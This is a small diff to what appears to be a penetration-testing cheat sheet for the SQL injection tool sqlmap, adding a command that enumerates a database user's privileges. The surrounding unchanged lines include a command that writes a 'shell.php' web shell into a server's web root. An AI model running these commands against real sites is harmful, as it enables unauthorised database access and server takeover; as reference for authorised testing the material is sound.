@@ -741,6 +741,9 @@ sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFpl
 # List all tamper scripts
 sqlmap --list-tampers
 
+# Enumerate the privileges that the database user has
+sqlmap -u "http://www.example.com/?id=1" --privileges 
+
 # Writing a file
 sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
 
